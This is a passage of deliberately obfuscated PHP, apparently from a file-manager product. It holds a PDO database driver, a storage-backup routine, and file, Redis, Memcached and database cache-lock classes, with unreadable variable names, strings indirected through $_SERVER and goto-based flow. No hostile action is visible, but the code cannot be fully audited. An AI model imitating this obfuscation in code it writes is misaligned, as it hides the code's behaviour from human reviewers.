$êÄ—ÈÇà[971]: $È‚‚ê¨Ğ = $êÄ—ÈÇà[990] . $êÄ—ÈÇà[991] . $êÄ—ÈÇà[992] . strtoupper($ûø’®¥) . $êÄ—ÈÇà[993] . strtoupper($ûø’®¥) . $êÄ—ÈÇà[994]; break; case $êÄ—ÈÇà[995]: $È‚‚ê¨Ğ = $êÄ—ÈÇà[996] . $ûø’®¥ . $êÄ—ÈÇà[997]; break; case $êÄ—ÈÇà[970]: break; case $êÄ—ÈÇà[998]: default: $È‚‚ê¨Ğ = $êÄ—ÈÇà[999] . ($this->dbType == $êÄ—ÈÇà[998] ? "\140{$ûø’®¥}\x60" : $ûø’®¥); } } $Ï­Õ»â€ = $this->query($È‚‚ê¨Ğ); $úùòšº = array(); if ($Ï­Õ»â€) { foreach ($Ï­Õ»â€ as $ÊüÀêç => $şúë•ÆÁ) { $şúë•ÆÁ = array_change_key_case($şúë•ÆÁ); $şúë•ÆÁ[$êÄ—ÈÇà[32]] = isset($şúë•ÆÁ[$êÄ—ÈÇà[32]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[32]] : $êÄ—ÈÇà[424]; $şúë•ÆÁ[$êÄ—ÈÇà[33]] = isset($şúë•ÆÁ[$êÄ—ÈÇà[33]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[33]] : $êÄ—ÈÇà[424]; $É‚î¶È = isset($şúë•ÆÁ[$êÄ—ÈÇà[319]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[319]] : $şúë•ÆÁ[$êÄ—ÈÇà[32]]; $úùòšº[$É‚î¶È] = array($êÄ—ÈÇà[32] => $É‚î¶È, $êÄ—ÈÇà[33] => $şúë•ÆÁ[$êÄ—ÈÇà[33]], $êÄ—ÈÇà[35] => (bool) (isset($şúë•ÆÁ[$êÄ—ÈÇà[105]]) && $şúë•ÆÁ[$êÄ—ÈÇà[105]] === $êÄ—ÈÇà[12] || isset($şúë•ÆÁ[$êÄ—ÈÇà[35]]) && $şúë•ÆÁ[$êÄ—ÈÇà[35]] === $êÄ—ÈÇà[12]), $êÄ—ÈÇà[37] => isset($şúë•ÆÁ[$êÄ—ÈÇà[37]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[37]] : (isset($şúë•ÆÁ[$êÄ—ÈÇà[56]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[56]] : $êÄ—ÈÇà[424]), $êÄ—ÈÇà[39] => isset($şúë•ÆÁ[$êÄ—ÈÇà[96]]) ? strtolower($şúë•ÆÁ[$êÄ—ÈÇà[96]]) == $êÄ—ÈÇà[41] : (isset($şúë•ÆÁ[$êÄ—ÈÇà[57]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[57]] : !1), $êÄ—ÈÇà[42] => isset($şúë•ÆÁ[$êÄ—ÈÇà[1000]]) ? strtolower($şúë•ÆÁ[$êÄ—ÈÇà[1000]]) == $êÄ—ÈÇà[44] : (isset($şúë•ÆÁ[$êÄ—ÈÇà[96]]) ? $şúë•ÆÁ[$êÄ—ÈÇà[96]] : !1)); } } return $úùòšº; } public function getTables($®Ë·´ÄÍ = '') { $†£ğ¸ =& $_SERVER[•Ùç É]; if (think_config($†£ğ¸[1001])) { $²¹‚´¢– = str_replace($†£ğ¸[1002], $®Ë·´ÄÍ, think_config($†£ğ¸[1001])); } else { switch ($this->dbType) { case $†£ğ¸[969]: case $†£ğ¸[971]: $²¹‚´¢– = $†£ğ¸[1003]; break; case $†£ğ¸[968]: case $†£ğ¸[986]: $²¹‚´¢– = $†£ğ¸[1004]; break; case $†£ğ¸[995]: $²¹‚´¢– = $†£ğ¸[1005]; break; case $†£ğ¸[970]: think_exception(think_lang($†£ğ¸[1006]) . $†£ğ¸[1007]); break; case $†£ğ¸[987]: $²¹‚´¢– = $†£ğ¸[45] . $†£ğ¸[46] . $†£ğ¸[47]; break; case $†£ğ¸[998]: default: if (!empty($®Ë·´ÄÍ)) { $²¹‚´¢– = $†£ğ¸[950] . $®Ë·´ÄÍ . $†£ğ¸[951]; } else { $²¹‚´¢– = $†£ğ¸[952]; } } } $òøÔë¨ö = $this->query($²¹‚´¢–); $ŒÅÃ„¹Ç = array(); foreach ($òøÔë¨ö as $š­•š×Ù => $ë¼¬— ‚) { $ŒÅÃ„¹Ç[$š­•š×Ù] = current($ë¼¬— ‚); } return $ŒÅÃ„¹Ç; } protected function parseLimit($±‡©êé) { $ì·€Ø´ß =& $_SERVER[•Ùç É]; $™‰¤® = $ì·€Ø´ß[12]; if (!empty($±‡©êé)) { switch ($this->dbType) { case $ì·€Ø´ß[995]: case $ì·€Ø´ß[987]: $±‡©êé = explode($ì·€Ø´ß[50], $±‡©êé); if (count($±‡©êé) > 1) { $™‰¤® .= $ì·€Ø´ß[51] . $±‡©êé[1] . $ì·€Ø´ß[52] . $±‡©êé[0] . $ì·€Ø´ß[53]; } else { $™‰¤® .= $ì·€Ø´ß[51] . $±‡©êé[0] . $ì·€Ø´ß[53]; } break; case $ì·€Ø´ß[968]: case $ì·€Ø´ß[986]: break; case $ì·€Ø´ß[970]: break; case $ì·€Ø´ß[969]: case $ì·€Ø´ß[971]: break; case $ì·€Ø´ß[998]: default: $™‰¤® .= $ì·€Ø´ß[51] . $±‡©êé . $ì·€Ø´ß[53]; } } return $™‰¤®; } public function parseKey(&$öæÎßå€, $Û¢íÖúê = true) { $å÷ËÛ =& $_SERVER[•Ùç É]; if ($Û¢íÖúê) { $öæÎßå€ = $this->parseKeyCheck($öæÎßå€); } if ($this->dbType == $å÷ËÛ[998]) { if ($öæÎßå€ != $å÷ËÛ[205] && !preg_match($å÷ËÛ[962], $öæÎßå€)) { $öæÎßå€ = $å÷ËÛ[431] . trim($öæÎßå€, $å÷ËÛ[431]) . $å÷ËÛ[431]; } return $öæÎßå€; } else { return parent::parseKey($öæÎßå€, $Û¢íÖúê); } } public function close() { $this->_linkID = null; } public function error() { $¶ØË›§ =& $_SERVER[•Ùç É]; if ($this->PDOStatement) { $¦Â´ ÑŒ = $this->PDOStatement->errorInfo(); $this->error = $¦Â´ ÑŒ[1] . $¶ØË›§[4] . $¦Â´ ÑŒ[2]; } else { $this->error = $¶ØË›§[12]; } if ($¶ØË›§[12] != $this->queryStr) { $this->error .= LNG($¶ØË›§[48]) . $this->queryStr; } think_trace($this->error, $¶ØË›§[12], $¶ØË›§[49]); return $this->error; } public function escapeString($Ãµ­É¤ğ) { $´š’½ñ‰ =& $_SERVER[•Ùç É]; switch ($this->dbType) { case $´š’½ñ‰[995]: case $´š’½ñ‰[968]: case $´š’½ñ‰[986]: case $´š’½ñ‰[998]: return addslashes($Ãµ­É¤ğ); case $´š’½ñ‰[970]: case $´š’½ñ‰[987]: case $´š’½ñ‰[969]: case $´š’½ñ‰[971]: return str_ireplace($´š’½ñ‰[58], $´š’½ñ‰[59], $Ãµ­É¤ğ); } } protected function parseValue($§İ²Ÿç¥) { $à¿î”„ =& $_SERVER[•Ùç É]; if (is_string($§İ²Ÿç¥)) { $½›šµóç = strpos($§İ²Ÿç¥, $à¿î”„[4]) === 0 && in_array($§İ²Ÿç¥, array_keys($this->bind)); $§İ²Ÿç¥ = $½›šµóç ? $this->escapeString($§İ²Ÿç¥) : $à¿î”„[1008] . $this->escapeString($§İ²Ÿç¥) . $à¿î”„[1008]; } elseif (isset($§İ²Ÿç¥[0]) && is_string($§İ²Ÿç¥[0]) && strtolower($§İ²Ÿç¥[0]) == $à¿î”„[343]) { $§İ²Ÿç¥ = $this->escapeString($§İ²Ÿç¥[1]); } elseif (is_array($§İ²Ÿç¥)) { $§İ²Ÿç¥ = array_map(array($this, $à¿î”„[1009]), $§İ²Ÿç¥); } elseif (is_bool($§İ²Ÿç¥)) { $§İ²Ÿç¥ = $§İ²Ÿç¥ ? $à¿î”„[90] : $à¿î”„[214]; } elseif (is_null($§İ²Ÿç¥)) { $§İ²Ÿç¥ = $à¿î”„[105]; } return $§İ²Ÿç¥; } public function getLastInsertId() { $¨¬Úôƒ® =& $_SERVER[•Ùç É]; switch ($this->dbType) { case $¨¬Úôƒ®[995]: case $¨¬Úôƒ®[987]: case $¨¬Úôƒ®[968]: case $¨¬Úôƒ®[986]: case $¨¬Úôƒ®[970]: case $¨¬Úôƒ®[998]: return $this->_linkID->lastInsertId(); case $¨¬Úôƒ®[969]: case $¨¬Úôƒ®[971]: $œÉÈ° = $this->table; $®·³óÓ¬ = $this->query("\x53\105\x4c\105\103\124\40{$œÉÈ°}\x2e\x63\x75\162\162\166\x61\154\x20\143\165\x72\162\166\x61\154\40\106\122\117\115\40\x64\165\141\154"); return $®·³óÓ¬ ? $®·³óÓ¬[0][$¨¬Úôƒ®[1010]] : 0; } } } goto Aäî»Üñ¨î; b¢Ä—›¸ø: class BackupFile { public function __construct() { } public function index() { $ğÒ•İœå = Backup::get(); $µµàû„ = $ğÒ•İœå[$_SERVER[•Ùç É][339]][$_SERVER[•Ùç É][216]][$_SERVER[•Ùç É][511]]; $£‚“ëÁ = array($_SERVER[•Ùç É][512] => array($_SERVER[•Ùç É][852], $µµàû„), $_SERVER[•Ùç É][853] => array($_SERVER[•Ùç É][377], $ğÒ•İœå[$_SERVER[•Ùç É][796]])); $‹ú¡àì = (int) Model($_SERVER[•Ùç É][834])->where($£‚“ëÁ)->count($_SERVER[•Ùç É][511]); $¯ß´»Ñã = (int) Model($_SERVER[•Ùç É][834])->where($£‚“ëÁ)->sum($_SERVER[•Ùç É][78]); $ŸŒÇ’ø– = new TaskFileTransfer($_SERVER[•Ùç É][854], $_SERVER[•Ùç É][825], $‹ú¡àì, LNG($_SERVER[•Ùç É][826]) . $_SERVER[•Ùç É][827] . LNG($_SERVER[•Ùç É][855])); $ŸŒÇ’ø–->task[$_SERVER[•Ùç É][808]] = $¯ß´»Ñã; $‹Ã¥Ã¨ô = array($_SERVER[•Ùç É][856] => $‹ú¡àì, $_SERVER[•Ùç É][857] => $¯ß´»Ñã, $_SERVER[•Ùç É][858] => time()); Backup::set($‹Ã¥Ã¨ô); $Âîà§ ½ = !0; $¿å¶ç÷ = $this->storeIds(); $‘ÛÀ†šÚ = 1; $¾ÙÖ§¹ = 1000; $Õ¦ö¥Ş¾ = $§ÏÑ¸Ë = 0; $°ª™‡ÈÖ = array(); $ŸÈ£œòî = $ñãÄÔ¯€ = 0; do { $€ûÒ¯ü· = $_SERVER[•Ùç É][859]; $¼¿ôÀ’¨ = Model($_SERVER[•Ùç É][834])->where($£‚“ëÁ)->field($€ûÒ¯ü·)->order($_SERVER[•Ùç É][860])->selectPage($¾ÙÖ§¹, $‘ÛÀ†šÚ); $Ôá´­ÎÄ = !empty($¼¿ôÀ’¨[$_SERVER[•Ùç É][415]]) ? $¼¿ôÀ’¨[$_SERVER[•Ùç É][415]] : array(); foreach ($Ôá´­ÎÄ as $§«Î¨‚ü) { if (!$this->_fileExist($§«Î¨‚ü, $°ª™‡ÈÖ, $¿å¶ç÷)) { $‹ú¡àì -= 1; $¯ß´»Ñã -= (int) $§«Î¨‚ü[$_SERVER[•Ùç É][78]]; write_log("\146\151\154\145\40\156\x6f\164\x20\x65\170\x69\163\x74\56\146\151\x6c\x65\x49\x44\x3a{$§«Î¨‚ü[$_SERVER[•Ùç É][511]]}\x2c\40\x70\x61\164\150\x3a{$§«Î¨‚ü[$_SERVER[•Ùç É][86]]}", $_SERVER[•Ùç É][861]); continue; } $„°°† ö = $§«Î¨‚ü[$_SERVER[•Ùç É][86]]; $Óû˜„Îü = "\173\151\x6f\x3a{$ğÒ•İœå[$_SERVER[•Ùç É][796]]}\175" . substr($„°°† ö, strlen("\173\151\157\x3a{$§«Î¨‚ü[$_SERVER[•Ùç É][862]]}\x7d")); if (IO::exist($Óû˜„Îü)) { $ŸŒÇ’ø–->updateFileEnd($§«Î¨‚ü[$_SERVER[•Ùç É][32]], $§«Î¨‚ü[$_SERVER[•Ùç É][78]]); } else { $Óû˜„Îü = get_path_father($Óû˜„Îü); IO::mkdir($Óû˜„Îü); if (!IO::copy($„°°† ö, $Óû˜„Îü, $_SERVER[•Ùç É][863])) { write_log($_SERVER[•Ùç É][864] . $„°°† ö . $_SERVER[•Ùç É][848] . $Óû˜„Îü . $_SERVER[•Ùç É][167], $_SERVER[•Ùç É][825]); $Âîà§ ½ = !1; break; } } $µµàû„ = $§«Î¨‚ü[$_SERVER[•Ùç É][511]]; $§ÏÑ¸Ë += 1; $Õ¦ö¥Ş¾ += $§«Î¨‚ü[$_SERVER[•Ùç É][78]]; $ñãÄÔ¯€ += 1; $ŸÈ£œòî += $§«Î¨‚ü[$_SERVER[•Ùç É][78]]; if ($Õ¦ö¥Ş¾ >= 1024 * 1024 * 100) { $‹Ã¥Ã¨ô = array($_SERVER[•Ùç É][865] => $µµàû„, $_SERVER[•Ùç É][866] => $ñãÄÔ¯€, $_SERVER[•Ùç É][867] => $ŸÈ£œòî); Backup::set($‹Ã¥Ã¨ô); $Õ¦ö¥Ş¾ = $§ÏÑ¸Ë = 0; } } $ğäºó± = count($Ôá´­ÎÄ); $‘ÛÀ†šÚ++; } while ($ğäºó± == $¾ÙÖ§¹); $ŸŒÇ’ø–->end(); $‹Ã¥Ã¨ô = array($_SERVER[•Ùç É][868] => 1, $_SERVER[•Ùç É][806] => time(), $_SERVER[•Ùç É][820] => 1, $_SERVER[•Ùç É][865] => $µµàû„, $_SERVER[•Ùç É][857] => $¯ß´»Ñã, $_SERVER[•Ùç É][856] => $‹ú¡àì, $_SERVER[•Ùç É][869] => time()); if ($§ÏÑ¸Ë) { $‹Ã¥Ã¨ô[$_SERVER[•Ùç É][866]] = $ñãÄÔ¯€; $‹Ã¥Ã¨ô[$_SERVER[•Ùç É][867]] = $ŸÈ£œòî; } Backup::set($‹Ã¥Ã¨ô); $this->_fileFilter($°ª™‡ÈÖ); return !0; } private function _fileExist($™ıÓƒÍ, &$¸Ì«­ãÀ, $Ú÷Š¤Ì) { $Ôí÷Ùã¹ =& $_SERVER[•Ùç É]; $Ç…µ×«¨ = $™ıÓƒÍ[$Ôí÷Ùã¹[86]]; if (in_array($™ıÓƒÍ[$Ôí÷Ùã¹[511]], $¸Ì«­ãÀ)) { return !1; } if (!in_array($™ıÓƒÍ[$Ôí÷Ùã¹[862]], $Ú÷Š¤Ì)) { return !1; } if (IO::exist($Ç…µ×«¨)) { return !0; } $¢ˆ‚¢Æ = get_path_father($Ç…µ×«¨); if (IO::exist($¢ˆ‚¢Æ)) { $¸Ì«­ãÀ[] = $™ıÓƒÍ[$Ôí÷Ùã¹[511]]; return !1; } $ä™éÎË¦ = array($Ôí÷Ùã¹[862] => $™ıÓƒÍ[$Ôí÷Ùã¹[862]], $Ôí÷Ùã¹[86] => array($Ôí÷Ùã¹[429], "{$¢ˆ‚¢Æ}\x25")); $î”¡—Çº = Model($Ôí÷Ùã¹[834])->where($ä™éÎË¦)->field($Ôí÷Ùã¹[512])->select(); $¸Ì«­ãÀ = array_merge($¸Ì«­ãÀ, array_to_keyvalue($î”¡—Çº, $Ôí÷Ùã¹[12], $Ôí÷Ùã¹[511])); return !1; } private function _fileFilter($•ş€€»¯) { $ø¾Éèá‡ =& $_SERVER[•Ùç É]; if (empty($•ş€€»¯)) { return; } $´ÃÉé®ú = array($ø¾Éèá‡[511] => array($ø¾Éèá‡[7], array_unique($•ş€€»¯))); $À¥†¡à = Model($ø¾Éèá‡[870])->where($´ÃÉé®ú)->field($ø¾Éèá‡[183])->select(); foreach ($À¥†¡à as $ÍŸ¢—Öâ) { Model($ø¾Éèá‡[870])->remove($ÍŸ¢—Öâ[$ø¾Éèá‡[183]], !1); } } private function storeIds() { $ë»´ƒØ =& $_SERVER[•Ùç É]; $ŒÄåòÙË = Model($ë»´ƒØ[812])->listData(); $†Å¿°ß = array(); $ÆÆ˜´²× = $GLOBALS[$ë»´ƒØ[6]][$ë»´ƒØ[91]][$ë»´ƒØ[871]]; foreach ($ŒÄåòÙË as $•ËÅ³Âñ) { $µáãğ„ƒ = strtolower($•ËÅ³Âñ[$ë»´ƒØ[97]]); if (!isset($ÆÆ˜´²×[$µáãğ„ƒ])) { continue; } $´Å§…¦Î = $ë»´ƒØ[76] . (isset($ÆÆ˜´²×[$µáãğ„ƒ]) ? $ÆÆ˜´²×[$µáãğ„ƒ] : ucfirst($µáãğ„ƒ)); if (!class_exists($´Å§…¦Î)) { continue; } $†Å¿°ß[] = $•ËÅ³Âñ[$ë»´ƒØ[445]]; } return $†Å¿°ß; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¾ÒÈóğµ =& $_SERVER[•Ùç É]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $› Æéñ· = $GLOBALS[$¾ÒÈóğµ[6]][$¾ÒÈóğµ[395]]; $¼¥ÑËŸ° = $› Æéñ·[$› Æéñ·[$¾ÒÈóğµ[872]]]; $·ÑãÏù£ = $› Æéñ·[$¾ÒÈóğµ[873]]; switch ($› Æéñ·[$¾ÒÈóğµ[872]]) { case $¾ÒÈóğµ[21]: self::$handle = Model($¾ÒÈóğµ[874]); break; case $¾ÒÈóğµ[875]: self::$handle = new CacheRedis($¼¥ÑËŸ°, $·ÑãÏù£); break; case $¾ÒÈóğµ[876]: self::$handle = new CacheMemcached($¼¥ÑËŸ°, $·ÑãÏù£); break; case $¾ÒÈóğµ[216]: self::$handle = new CacheFile($¼¥ÑËŸ°, $·ÑãÏù£); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ûàç¤Í¨) { if (is_array($Ûàç¤Í¨) || is_object($Ûàç¤Í¨)) { $Ûàç¤Í¨ = json_encode($Ûàç¤Í¨); } $Ûàç¤Í¨ = rawurlencode($Ûàç¤Í¨); return md5(KOD_SITE_ID . $_SERVER[•Ùç É][11] . $Ûàç¤Í¨); } public static function get($ùƒØ–Ôö, $·¹¶ºÇĞ = false) { $«ÎšËß¥ = self::key($ùƒØ–Ôö); $êìæÖ = self::init(); if ($·¹¶ºÇĞ) { return unserialize($êìæÖ->get($«ÎšËß¥)); } if (!isset(self::$memoryCache[$«ÎšËß¥])) { $•™ßÏê = $êìæÖ->get($«ÎšËß¥); self::$memoryCache[$«ÎšËß¥] = unserialize($•™ßÏê); } return self::$memoryCache[$«ÎšËß¥]; } public static function set($ÛˆÇ®±ª, $Üİ’´å, $Ñ¼ÁåÆ = false) { $ñ§ÅÜ“ï =& $_SERVER[•Ùç É]; $µÆš„Ûõ = self::key($ÛˆÇ®±ª); if (isset(self::$memoryCache[$µÆš„Ûõ]) && self::$memoryCache[$µÆš„Ûõ] === $Üİ’´å) { return !0; } if ($Ñ¼ÁåÆ === 0) { self::$memoryCache[$µÆš„Ûõ] = $Üİ’´å; return !0; } $åÓÊĞª¥ = self::init(); $ã«®ò¤³ = serialize($Üİ’´å); CacheLock::lock($ÛˆÇ®±ª . $ñ§ÅÜ“ï[877]); $âİ”¼Ã· = $åÓÊĞª¥->set($µÆš„Ûõ, $ã«®ò¤³, $Ñ¼ÁåÆ); self::$memoryCache[$µÆš„Ûõ] = $Üİ’´å; CacheLock::unlock($ÛˆÇ®±ª . $ñ§ÅÜ“ï[877]); return $âİ”¼Ã·; } public static function getCall($Æİ­îÅÈ, $ÓğÊƒÅ„, $Íò‡Øò, $ØŒÂ¶êÒ = array()) { $Ÿ÷®ÎÌÍ =& $_SERVER[•Ùç É]; $›³º‘Šá = self::get($Æİ­îÅÈ); if ($›³º‘Šá || $›³º‘Šá === $Ÿ÷®ÎÌÍ[12]) { return $›³º‘Šá; } $›³º‘Šá = call_user_func_array($Íò‡Øò, $ØŒÂ¶êÒ); $›³º‘Šá = $›³º‘Šá ? $›³º‘Šá : $Ÿ÷®ÎÌÍ[12]; self::set($Æİ­îÅÈ, $›³º‘Šá, $ÓğÊƒÅ„); return $›³º‘Šá; } public static function remove($¶Àã°¬ì) { $¥ƒãˆŒĞ = self::key($¶Àã°¬ì); unset(self::$memoryCache[$¥ƒãˆŒĞ]); self::clearTimeout(); CacheLock::lock($¶Àã°¬ì); $’ü‡Ó = self::init()->remove($¥ƒãˆŒĞ); CacheLock::unlock($¶Àã°¬ì); return $’ü‡Ó; } public static function removeMemory($¸—õ¶ÚÒ) { $²ş†â–Ú = self::key($¸—õ¶ÚÒ); unset(self::$memoryCache[$²ş†â–Ú]); } public static function clearMemory($Ğã‰Ø„Ÿ = false) { if ($Ğã‰Ø„Ÿ) { $Ğã‰Ø„Ÿ = self::key($Ğã‰Ø„Ÿ); unset(self::$memoryCache[$Ğã‰Ø„Ÿ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[•Ùç É][878])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[•Ùç É][879])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¸‹¿ı„°, $•‰¥²“ƒ) { $Úúúšïı =& $_SERVER[•Ùç É]; $this->cachePath = $¸‹¿ı„°[$Úúúšïı[86]]; $this->prefix = $Úúúšïı[880]; $this->cacheTime = $•‰¥²“ƒ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¿Å¡È—–) { $øªûÒåÍ =& $_SERVER[•Ùç É]; $¿Å¡È—– = str_replace(array($øªûÒåÍ[881], $øªûÒåÍ[99], $øªûÒåÍ[75]), $øªûÒåÍ[882], $¿Å¡È—–); return $this->cachePath . $øªûÒåÍ[883] . $¿Å¡È—– . $øªûÒåÍ[884]; } public function set($çüºñƒ, $Í¬ì¢ŒÚ, $¿ªÌ¡È˜ = false) { $¿ªÌ¡È˜ = $¿ªÌ¡È˜ ? $¿ªÌ¡È˜ : $this->cacheTime; $Ùµ‚ù›Á = $this->getFile($çüºñƒ); if (file_put_contents($Ùµ‚ù›Á, $this->prefix . $Í¬ì¢ŒÚ, LOCK_EX)) { @touch($Ùµ‚ù›Á, intval(time() + $¿ªÌ¡È˜)); clearstatcache(); return !0; } @unlink($Ùµ‚ù›Á); return !1; } public function get($ïç®Ú¼Ö) { $»¹˜½ßõ = $this->getFile($ïç®Ú¼Ö); if (file_exists($»¹˜½ßõ) && filemtime($»¹˜½ßõ) < time()) { @unlink($»¹˜½ßõ); return !1; } $æëÂ‘™ã = @file_get_contents($»¹˜½ßõ); return substr($æëÂ‘™ã, strlen($this->prefix)); } public function remove($³ŠğĞÕÑ) { $¦ ã¹ƒ¨ = $this->getFile($³ŠğĞÕÑ); return @unlink($¦ ã¹ƒ¨); } public function deleteAll() { $‚Ú­ªªÑ =& $_SERVER[•Ùç É]; $ıäÊ´”¥ = scandir($this->cachePath); foreach ($ıäÊ´”¥ as $¼´ª‰ñ) { $‚±¤ù‘² = $this->cachePath . $¼´ª‰ñ; if (strpos($‚±¤ù‘², $‚Ú­ªªÑ[884]) && strpos($‚±¤ù‘², $‚Ú­ªªÑ[885])) { @unlink($‚±¤ù‘²); } } } public function clearTimeout() { $¥ªáÓÙº =& $_SERVER[•Ùç É]; $¦›â¢§ï = scandir($this->cachePath); foreach ($¦›â¢§ï as $¢ŠÓ «) { $şÅ¨¤àÅ = $this->cachePath . $¢ŠÓ «; if (strpos($şÅ¨¤àÅ, $¥ªáÓÙº[884]) && strpos($şÅ¨¤àÅ, $¥ªáÓÙº[885]) && filemtime($şÅ¨¤àÅ) < time()) { @unlink($şÅ¨¤àÅ); } } } } goto F±ˆåˆ£ÏÚ; D´ÜÍÙÕ”®: class CacheLockRedis { public function lock($¼‰ø…ÁŞ, $Á…ù¥« = 10) { $ì¿Éó“ï = Cache::init(); $ˆ’ÅÓõí = microtime(!0) + $Á…ù¥«; while (microtime(!0) < $ˆ’ÅÓõí) { $¸–¿İİá = $ì¿Éó“ï->get($¼‰ø…ÁŞ); if (!$¸–¿İİá) { $³ö×ñ•Ö = $ì¿Éó“ï->setLock($¼‰ø…ÁŞ, $ˆ’ÅÓõí, $Á…ù¥«); if ($³ö×ñ•Ö) { return !0; } } else { if ($¸–¿İİá < microtime(!0)) { $ì¿Éó“ï->set($¼‰ø…ÁŞ, $ˆ’ÅÓõí, $Á…ù¥« * 2); if ($ì¿Éó“ï->get($¼‰ø…ÁŞ) === $¸–¿İİá) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($†èô¤Ê·) { return Cache::init()->get($†èô¤Ê·); } public function unlock($Š—Ğ±Î¢) { return Cache::init()->remove($Š—Ğ±Î¢); } } class CacheLockMemcached { public function lock($¼äÚ‰÷, $“Œ´Üõî = 0) { $óƒšú€± = Cache::init(); $ˆ£á = microtime(!0) + $“Œ´Üõî; while (microtime(!0) < $ˆ£á) { $Š–İìµõ = $óƒšú€±->get($¼äÚ‰÷); if (!$Š–İìµõ || $Š–İìµõ < microtime(!0)) { $üÊô‰¬Œ = $óƒšú€±->handle->add($¼äÚ‰÷, $ˆ£á, $“Œ´Üõî); if ($üÊô‰¬Œ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($æûÖ¬Ó‹) { return Cache::init()->get($æûÖ¬Ó‹); } public function unlock($Ï‡ß§Ó) { return Cache::init()->remove($Ï‡ß§Ó); } } class CacheLockDatabase { public function lock($“Çê®„§, $ù®òºµÉ = 0) { $°¡‰¹à· = Model($_SERVER[•Ùç É][874]); $ºİé¯ŠÊ = microtime(!0) + $ù®òºµÉ; while (microtime(!0) < $ºİé¯ŠÊ) { $Ğë¹Ììå = $°¡‰¹à·->get($“Çê®„§); if (!$Ğë¹Ììå || $Ğë¹Ììå < microtime(!0)) { $›ã’Ûı¦ = $°¡‰¹à·->set($“Çê®„§, $ºİé¯ŠÊ); if ($›ã’Ûı¦) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($„¥úØğÆ) { return Model($_SERVER[•Ùç É][874])->get($„¥úØğÆ); } public function unlock($¨ş¾ŠÀÊ) { Model($_SERVER[•Ùç É][874])->remove($¨ş¾ŠÀÊ); } } goto aæáíÀÆÌŸ; F•‘‡†èô: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÅíŸµ° = false, $Ôõª‚³­ = '', $ã’ÉŒ¦— = false) { $”‹ğúå¤ =& $_SERVER[•Ùç É]; $ˆş¸­Ù = $this->cacheGet($Ôõª‚³­); $“…µ¡± = $this->optionDefault($Ôõª‚³­); $“…µ¡± = is_array($“…µ¡±) ? $“…µ¡± : array(); if (is_array($ˆş¸­Ù)) { $ˆş¸­Ù = array_merge($“…µ¡±, $ˆş¸­Ù); return $ÅíŸµ° ? isset($ˆş¸­Ù[$ÅíŸµ°]) ? $ˆş¸­Ù[$ÅíŸµ°] : null : $ˆş¸­Ù; } $öëßé = $this->filterWhere(array($”‹ğúå¤[33] => $Ôõª‚³­)); $ˆş¸­Ù = $this->where($öëßé)->select(); $ˆş¸­Ù = array_to_keyvalue($ˆş¸­Ù, $”‹ğúå¤[96], $”‹ğúå¤[420]); foreach ($ˆş¸­Ù as $¨ÊÕÉÍ­ => $ÇöÌèìİ) { if ($ã’ÉŒ¦— || in_array($¨ÊÕÉÍ­, $this->jsonField)) { $ˆş¸­Ù[$¨ÊÕÉÍ­] = json_decode($ÇöÌèìİ, !0); } } $this->cacheSet($Ôõª‚³­, $ˆş¸­Ù); $ˆş¸­Ù = array_merge($“…µ¡±, $ˆş¸­Ù); return $ÅíŸµ° ? $ˆş¸­Ù[$ÅíŸµ°] : $ˆş¸­Ù; } public function set($·Ø‘Ë·î, $öÃ™“¿ş = false, $«áË‰ = '') { $ÔÈÎ¿·ï =& $_SERVER[•Ùç É]; $this->cacheRemove($«áË‰); $ş€¿‹ = array(); $•Áíæáı = is_array($·Ø‘Ë·î) ? $·Ø‘Ë·î : array($·Ø‘Ë·î => $öÃ™“¿ş); foreach ($•Áíæáı as $İ’°ªè­ => $Â­ì‚á) { if (is_array($Â­ì‚á)) { $Â­ì‚á = json_encode_force($Â­ì‚á); } $this->checkLength($Â­ì‚á, !1, $this->tableName . $ÔÈÎ¿·ï[4] . $·Ø‘Ë·î); $Â­ì‚á = self::textEncode($Â­ì‚á); $•Áíæáı = array($ÔÈÎ¿·ï[33] => $«áË‰, $ÔÈÎ¿·ï[96] => $İ’°ªè­, $ÔÈÎ¿·ï[420] => $Â­ì‚á); $ş€¿‹[] = $this->filterWhere($•Áíæáı); } if (!$ş€¿‹) { return !0; } $áŒæ«À = $this->cacheKey($ÔÈÎ¿·ï[446]); CacheLock::lock($áŒæ«À); $€É¾Š¯Ñ = $this->addAll($ş€¿‹, array(), !0); CacheLock::unlock($áŒæ«À); return $€É¾Š¯Ñ; } protected function optionDefault($îó³Ÿ—Á = '') { return !1; } public function setDeep($ğ€ĞÈ÷, $¯«ÏˆÆÔ = false, $ÆÕ²—°¶ = '') { $×´Â²á = explode($_SERVER[•Ùç É][10], $ğ€ĞÈ÷); $Õ²í¡‰ò = $this->get(); array_set_value($Õ²í¡‰ò, $ğ€ĞÈ÷, $¯«ÏˆÆÔ); $this->set($×´Â²á[0], $Õ²í¡‰ò[$×´Â²á[0]], $ÆÕ²—°¶); } public function remove($ÈîÈ²•, $ÔÎ¡åÁ = '') { $Û…ûÇÂ =& $_SERVER[•Ùç É]; $this->cacheRemove($ÔÎ¡åÁ); $Öß‡°Êß = $this->filterWhere(array($Û…ûÇÂ[96] => $ÈîÈ²•, $Û…ûÇÂ[33] => $ÔÎ¡åÁ)); if (is_null($ÈîÈ²•)) { unset($Öß‡°Êß[$Û…ûÇÂ[96]]); } return $this->where($Öß‡°Êß)->delete(); } public function cacheSet($Ò‰Éø‰±, $ØÜà™Ë¿ = false) { return Cache::set($this->cacheKey($Ò‰Éø‰±), $ØÜà™Ë¿); } public function cacheGet($Ö©Ôü†é) { 